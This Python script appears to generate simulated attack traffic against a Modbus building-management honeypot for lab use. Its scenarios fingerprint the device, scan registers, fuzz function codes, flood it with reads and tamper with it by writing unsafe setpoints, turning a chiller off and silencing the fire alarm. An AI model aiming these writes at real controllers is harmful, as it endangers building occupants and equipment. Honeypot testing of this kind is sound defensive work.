#!/usr/bin/env python3
"""Generate realistic attack traffic against the honeypot (lab use only).

Each scenario mirrors a stage of a real ICS attack. In "all" mode every
scenario connects from a different loopback address (127.0.0.x) so the
dashboard shows several distinct attackers.

Example:
    python simulate_attacker.py --target 127.0.0.1 --port 5020 --scenario all
"""

import argparse
import random
import socket
import struct
import time

from honeypot import modbus


class ModbusClient:
    def __init__(self, host, port, source=None, timeout=3):
        self.sock = socket.create_connection((host, port), timeout=timeout,
                                             source_address=(source, 0) if source else None)
        self.tid = 0

    def request(self, pdu, unit=1):
        self.tid = (self.tid + 1) & 0xFFFF
        self.sock.sendall(modbus.build_frame(self.tid, unit, pdu))
        header = self._recv(7)
        _, _, length, _ = modbus.MBAP_HEADER.unpack(header)
        return self._recv(length - 1)

    def _recv(self, n):
        data = b""
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("connection closed")
            data += chunk
        return data

    def close(self):
        self.sock.close()


def show(label, pdu):
    if pdu[0] & 0x80:
        print(f"  {label:<42} -> exception {modbus.EXCEPTION_NAMES.get(pdu[1], pdu[1])}")
    else:
        print(f"  {label:<42} -> ok ({len(pdu)} bytes)")


# ---------------------------------------------------------------------------
def scenario_recon(c):
    """Fingerprint the device, like Nmap's modbus-discover script."""
    resp = c.request(modbus.device_identification_request())
    show("Read Device Identification (FC43)", resp)
    vendor = resp[9:9 + resp[8]].decode(errors="replace") if not resp[0] & 0x80 else "?"
    print(f"  identified vendor: {vendor}")
    show("Report Server ID (FC17)", c.request(modbus.report_server_id_request()))


def scenario_scan(c):
    """Probe register addresses to map which points exist."""
    for address in list(range(0, 16)) + [100, 200, 500, 1000]:
        resp = c.request(modbus.read_request(3, address, 1))
        if not resp[0] & 0x80:
            value = struct.unpack(">H", resp[2:4])[0]
            print(f"  holding register {address:<4} exists (value {value})")
    for address in range(0, 8):
        c.request(modbus.read_request(1, address, 1))
    print("  coil and register map enumerated")


def scenario_read(c):
    """Read live sensor values, like an attacker studying the process."""
    show("Read Input Registers 0-5 (sensors)", c.request(modbus.read_request(4, 0, 6)))
    show("Read Holding Registers 0-5 (setpoints)", c.request(modbus.read_request(3, 0, 6)))
    show("Read Coils 0-5 (equipment status)", c.request(modbus.read_request(1, 0, 6)))


def scenario_tamper(c):
    """Change setpoints and safety points: the impact stage of an attack."""
    show("Write fan speed to 90%", c.request(modbus.write_single_register_request(3, 90)))
    show("Write Zone 1 setpoint to 35.0 C (unsafe)", c.request(modbus.write_single_register_request(0, 350)))
    show("Write Zone 1+2 setpoints to 5.0 C (unsafe)",
         c.request(modbus.write_multiple_registers_request(0, [50, 50])))
    show("Turn chiller OFF", c.request(modbus.write_single_coil_request(1, False)))
    show("Enable fire damper override (safety)", c.request(modbus.write_single_coil_request(4, True)))
    show("Silence fire alarm (safety)", c.request(modbus.write_single_coil_request(5, True)))


def scenario_fuzz(c):
    """Send unusual function codes, like a fuzzer hunting for crashes."""
    for fc in (8, 20, 21, 22, 24, 90, 125):
        c.request(bytes([fc]) + bytes(random.getrandbits(8) for _ in range(4)))
    print("  sent 7 unsupported function codes")


def scenario_flood(c):
    """Burst of reads, like an aggressive scanner or polling DoS."""
    for _ in range(40):
        c.request(modbus.read_request(4, 0, 6))
    print("  sent 40 rapid read requests")


SCENARIOS = {
    "recon": (scenario_recon, "127.0.0.11"),
    "scan": (scenario_scan, "127.0.0.12"),
    "read": (scenario_read, "127.0.0.13"),
    "tamper": (scenario_tamper, "127.0.0.14"),
    "fuzz": (scenario_fuzz, "127.0.0.15"),
    "flood": (scenario_flood, "127.0.0.16"),
}


def run(name, target, port, use_sources):
    func, source = SCENARIOS[name]
    print(f"\n[{name}] {func.__doc__.strip()}")
    try:
        client = ModbusClient(target, port, source=source if use_sources else None)
    except OSError:
        client = ModbusClient(target, port)   # loopback aliases unavailable on this OS
    try:
        func(client)
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser(description="Attack simulator for the BMS honeypot (lab use only)")
    parser.add_argument("--target", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument("--scenario", default="all", choices=["all", *SCENARIOS])
    parser.add_argument("--single-source", action="store_true",
                        help="connect from the default address instead of 127.0.0.x aliases")
    args = parser.parse_args()

    use_sources = args.target.startswith("127.") and not args.single_source
    names = list(SCENARIOS) if args.scenario == "all" else [args.scenario]
    for name in names:
        run(name, args.target, args.port, use_sources)
        time.sleep(1)
    print("\ndone - open the dashboard to see what the honeypot recorded")


if __name__ == "__main__":
    main()
